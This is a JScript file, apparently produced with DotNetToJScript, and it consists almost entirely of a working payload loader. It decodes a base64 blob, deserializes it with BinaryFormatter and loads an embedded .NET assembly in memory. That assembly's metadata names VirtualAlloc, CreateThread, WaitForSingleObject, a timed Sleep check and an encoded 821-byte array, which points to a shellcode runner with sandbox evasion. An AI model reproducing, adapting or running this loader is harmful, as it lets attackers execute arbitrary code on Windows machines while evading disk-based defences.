function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABoAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAiqT4YwAAAAAA"+
"AAAA4AAiIAsBMAAAEAAAAAgAAAAAAADeKwAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAjCsA"+
"AE8AAAAAQAAADAQAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAFQqAAAcAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAAAcDwAAACAAAAAQAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAADAQAAABA"+
"AAAABgAAABIAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAYAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAMArAAAAAAAASAAAAAIABQAcIQAAOAkAAAEAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzAGALYAAAAB"+
"AAARAigPAAAKKBAAAAoKINAHAAAoBAAABigQAAAKEwQSBAYoEQAAChMFEgUoEgAACiMAAAAAAAD4"+
"PzQBKiA1AwAAjRQAAAEl0AEAAAQoEwAACgsWEwYrFwcRBgcRBpEYWSD/AAAAX9KcEQYXWBMGEQYH"+
"jmky4geOaQx+FAAACiAAEAAAIAAwAAAfQCgBAAAGDQcWCQgoFQAACn4UAAAKFgl+FAAAChZ+FAAA"+
"CigCAAAGFSgDAAAGJioiAygWAAAKJioAQlNKQgEAAQAAAAAADAAAAHYyLjAuNTA3MjcAAAAABQBs"+
"AAAAOAMAACN+AACkAwAAJAQAACNTdHJpbmdzAAAAAMgHAAAEAAAAI1VTAMwHAAAQAAAAI0dVSUQA"+
"AADcBwAAXAEAACNCbG9iAAAAAAAAAAIAAAFXlQI0CQIAAAD6ATMAFgAAAQAAABoAAAAEAAAAAQAA"+
"AAYAAAAOAAAAFgAAAA8AAAABAAAAAQAAAAEAAAAEAAAAAQAAAAEAAAACAAAAAQAAAAAAjgIBAAAA"+
"AAAGANEBOgMGAD4COgMGAB4B6AIPAFoDAAAGAEYBsgIGALQBsgIGAJUBsgIGACUCsgIGAPEBsgIG"+
"AAoCsgIGAF0BsgIGADIBGwMGABABGwMGAHgBsgIGAN8DogIGANEAogIGAKkCogIGAPUAOgMGANoA"+
"ogIGAFwCogIGAIwDOgMGAAgEogIGALYAogIGAOECogIGAHkCGwMKAKgD6AIAAAAAYAAAAAAAAQAB"+
"AAEAEACbAwAAPQABAAEAAAEAAGkAAAA9AAEABwATAQAAAQAAAE0AAgAHADMBHwBbAAAAAACAAJEg"+
"kQBfAAEAAAAAAIAAkSCpAGcABQAAAAAAgACRINIDcQALAAAAAACAAJEgyQJ3AA0AUCAAAAAAhhjb"+
"AgYADgASIQAAAACGAKUDEAAOAAAAAQCwAwAAAgBtAgAAAwDkAAAABADmAwAAAQBpAwAAAgBhAgAA"+
"AwC6AwAABADPAgAABQB8AwAABgCeAAAAAQDJAAAAAgAMAwAAAQAMAwAAAQB0AgkA2wIBABEA2wIG"+
"ABkA2wIKACkA2wIQADEA2wIQADkA2wIQAEEA2wIQAEkA2wIQAFEA2wIQAFkA2wIQAGEA2wIVAGkA"+
"2wIQAHEA2wIQAJEA2wIGAHkA2wIGAIEA9gMoAIEAyQMtAIkA+wI0AKkA/gM4AMEAxAJAAMkAHgRD"+
"ANEA8ANMAC4ACwB8AC4AEwCFAC4AGwCkAC4AIwCtAC4AKwDCAC4AMwDsAC4AOwDsAC4AQwCtAC4A"+
"SwDyAC4AUwDsAC4AWwDsAC4AYwAXAS4AawBBAUMAWwBOAWMAcwBUAQEANQMAAAQAGgCBAkEBAwCR"+
"AAEAAAEFAKkAAQAAAQcA0gMBAAABCQDJAgEA5CsAAAEABIAAAAEAAAAAAAAAAAAAAAAADgQAAAIA"+
"AAAAAAAAAAAAAFIAiAAAAAAAAgAAAAAAAAAAAAAAUgCiAgAAAAAEAAMAAAAAX19TdGF0aWNBcnJh"+
"eUluaXRUeXBlU2l6ZT04MjEAMThGNkYzNzMzMDZFQTEyNzhCRDUyQTcyQTg4RUZDNERFMjdBNUFG"+
"M0Q2RUUxODRFNjNGM0ZGRUE5Q0Y2NDg5OQA8TW9kdWxlPgA8UHJpdmF0ZUltcGxlbWVudGF0aW9u"+
"RGV0YWlscz4AbXNjb3JsaWIAVmlydHVhbEFsbG9jAGxwVGhyZWFkSWQAQ3JlYXRlVGhyZWFkAFJ1"+
"bnRpbWVGaWVsZEhhbmRsZQBoSGFuZGxlAERhdGVUaW1lAFZhbHVlVHlwZQBmbEFsbG9jYXRpb25U"+
"eXBlAENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0"+
"dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1i"+
"bHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJs"+
"eUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21w"+
"aWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3Nl"+
"bWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNv"+
"bXBhdGliaWxpdHlBdHRyaWJ1dGUAQnl0ZQBkd1N0YWNrU2l6ZQBkd1NpemUAcGF0aABNYXJzaGFs"+
"AGtlcm5lbDMyLmRsbABFeGFtcGxlQXNzZW1ibHkuZGxsAFN5c3RlbQBUaW1lU3BhbgBTeXN0ZW0u"+
"UmVmbGVjdGlvbgBaZXJvAFNsZWVwAGxwUGFyYW1ldGVyAC5jdG9yAEludFB0cgBTeXN0ZW0uRGlh"+
"Z25vc3RpY3MAZ2V0X1RvdGFsU2Vjb25kcwBkd01pbGxpc2Vjb25kcwBTeXN0ZW0uUnVudGltZS5J"+
"bnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdN"+
"b2RlcwBscFRocmVhZEF0dHJpYnV0ZXMAZHdDcmVhdGlvbkZsYWdzAFJ1bnRpbWVIZWxwZXJzAFRl"+
"c3RDbGFzcwBSdW5Qcm9jZXNzAGxwQWRkcmVzcwBscFN0YXJ0QWRkcmVzcwBTdWJ0cmFjdABXYWl0"+
"Rm9yU2luZ2xlT2JqZWN0AGZsUHJvdGVjdABTdGFydABnZXRfTm93AEluaXRpYWxpemVBcnJheQBF"+
"eGFtcGxlQXNzZW1ibHkAQ29weQAAAAAAANS+mPyI3ndOuXld17WmQlkABCABAQgDIAABBSABARER"+
"BCABAQ4EIAEBAg0HBxFBHQUIGBFBEUUIBAAAEUEGIAERRRFBAyAADQcAAgESWRFdAgYYCAAEAR0F"+
"CBgIBQABEmkOCLd6XFYZNOCJAwYREAcABBgYCQkJCQAGGBgJGBgJGAUAAgkYCQQAAQEJCAEACAAA"+
"AAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQgBAAIAAAAAABQBAA9FeGFtcGxlQXNz"+
"ZW1ibHkAACkBACRFeGFtcGxlIEFzc2VtYmx5IGZvciBEb3ROZXRUb0pTY3JpcHQAAAUBAAAAACQB"+
"AB9Db3B5cmlnaHQgwqkgSmFtZXMgRm9yc2hhdyAyMDE3AAApAQAkNTY1OThmMWMtNmQ4OC00OTk0"+
"LWEzOTItYWYzMzdhYmU1Nzc3AAAMAQAHMS4wLjAuMAAABQEAAQAABAEAAAAAAAAAAAAAiqT4YwAA"+
"AAACAAAAHAEAAHAqAABwDAAAUlNEU4emU9GWxLBPnuABG4rQCIYBAAAAQzpcVG9vbHNcRG90TmV0"+
"VG9KU2NyaXB0LTEuMC40XERvdE5ldFRvSlNjcmlwdC0xLjAuNFxFeGFtcGxlQXNzZW1ibHlcb2Jq"+
"XFJlbGVhc2VcRXhhbXBsZUFzc2VtYmx5LnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAC0KwAAAAAAAAAAAADOKwAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"wCsAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIAAQ7SldVWGy7/6w"+
"d/9ZW1VgjAgyCUoByUoByGiDQRwhdgmCQO937O3oAePq1gEBARUS7/o5SkVOounuv2fwSUxFT5wX"+
"IhZa7tld8dd4lDHmsmkZlTDpZ/v99/H0+snx7vESGunxVZIB5fXhHRUdVExUTUNVJMt4VZpLdUxd"+
"kkMFR1WaSzVVHq5bU12SY01gLNxVJN3BKXRpEzk1XNTUIFwU3PP4Q1WaSzWSUyldHMVcRH+UZQ0S"+
"ExaYaxUdFZKVlRUdFVWY3Wl+XRzFkl0FRWGaXTVUFM3yT2As3FXu1FSSKZVdHMdVJN1U3NwYwVwU"+
"3C39aOxhGmFBHWAszGjFTWGaXTlUFM13XJoZXWGaXRFUFM1UkhmVXRzFXE1cTUdMQ1RFVERUQ12a"+
"AT1US+79TVxMQ12SA/Ra5u7mUFUkwkJUr258d3x3eHEVXEdVnPxc3tNZZj8W5shKQlWc/EJDYCzV"+
"WCTUQkpcoytPbL4VHRUd7tD9GBUdFSwsKz8sJyU/MSg3KB1LVZzcXN7VohQdFVgk1EJKexpCVKtO"+
"nIbXHRUdFebI9bcdFR0+UWlQSCpcRklbgFNNfld8UlddcyJ6Zl9GXHh/Vl4icleBYktbRIBUf25/"+
"a19fc21DY11sdmFDUUksJWFUYGJff0N9al14ZSp2LnRlXi94RW14bWUsJXuBgHp0VHJKWi5DUlZa"+
"IltaU3MtJUV7OHklZjh5WSRLQ1QmfmGBKE9+cSRLaXZ/WnNPS1VGRWl8gFZ0fidbcmxEe3wkS1pN"+
"entaeHBJSmUdXZTUSktcTVgk1EJVrR0jtZkdFR0VTUJKXN7T8kg3KubIVZzfexNOVZzsewZLS32d"+
"Ih0VVJz9eyFURFyjaF+PnxUdFR3u0GAs1UpLVZzsYCzcWCTUQkpc3tM4FwVq5sig1XAOVdbcnQoV"+
"HVyjWe0o/RUdFR3u0F3m3nET8rv1SB0VHUJEe11LVJzM1PsFVNbdFQ0VHVyjTcFCABUdFR3u0F2K"+
"QkpdlPZVnOxdlMtU1t0VPRUdXJTsVKsLh5TzHRUdFebIVZLhNaDVcaN/mh5dHNKg1XDDRdJFex1M"+
"ovUIOxNUlMvmyOayHCEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEA"+
"AQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAsAMAAAAAAAAAAAAAsAM0AAAAVgBT"+
"AF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8A"+
"AAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAA"+
"ACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBBADAAABAFMAdAByAGkAbgBnAEYA"+
"aQBsAGUASQBuAGYAbwAAAOwCAAABADAAMAAwADAAMAA0AGIAMAAAAGIAJQABAEMAbwBtAG0AZQBu"+
"AHQAcwAAAEUAeABhAG0AcABsAGUAIABBAHMAcwBlAG0AYgBsAHkAIABmAG8AcgAgAEQAbwB0AE4A"+
"ZQB0AFQAbwBKAFMAYwByAGkAcAB0AAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAA"+
"AAAAAABIABAAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAARQB4AGEAbQBwAGwA"+
"ZQBBAHMAcwBlAG0AYgBsAHkAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAw"+
"AC4AMAAuADAAAABIABQAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEUAeABhAG0AcABsAGUA"+
"QQBzAHMAZQBtAGIAbAB5AC4AZABsAGwAAABiAB8AAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBo"+
"AHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIABKAGEAbQBlAHMAIABGAG8AcgBzAGgAYQB3ACAA"+
"MgAwADEANwAAAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABQ"+
"ABQAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAARQB4AGEAbQBwAGwAZQBBAHMA"+
"cwBlAG0AYgBsAHkALgBkAGwAbAAAAEAAEAABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAARQB4"+
"AGEAbQBwAGwAZQBBAHMAcwBlAG0AYgBsAHkAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMA"+
"aQBvAG4AAAAxAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBp"+
"AG8AbgAAADEALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAIAAADAAAAOA7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZsZWN0"+
"aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}